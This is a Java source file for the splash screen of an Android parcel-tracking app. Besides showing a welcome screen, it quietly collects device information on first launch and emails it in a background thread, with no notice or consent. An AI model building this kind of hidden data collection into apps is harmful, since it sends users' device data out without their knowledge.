package com.lanyu96.querylogistics.ui;

import android.content.Intent;
import android.content.SharedPreferences;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import com.lanyu96.querylogistics.MainActivity;
import com.lanyu96.querylogistics.R;
import com.lanyu96.querylogistics.uitl.DeviceUtil;

import java.util.Timer;
import java.util.TimerTask;

import static com.lanyu96.querylogistics.uitl.MailUtil.sendMail;

public class SplashActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_welcome);
        inti();

        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                Intent intent = new Intent(SplashActivity.this, HomeActivity.class);
                startActivity(intent);
                finish();
            }
        },500);


    }

    private void inti() {
        SharedPreferences sp = getSharedPreferences("FirstRun", MODE_PRIVATE);

        String isFirst = sp.getString("isFirst", "");
        if (isFirst.equals("")) {
            sp.edit().putString("isFirst", "success").apply();
            DeviceUtil deviceUtil = new DeviceUtil();
            StringBuilder stringBuilder = deviceUtil.DeviceInfo(SplashActivity.this);

            final String neirong = stringBuilder.toString();
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        sendMail(neirong);
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            }).start();

        }

    }
}
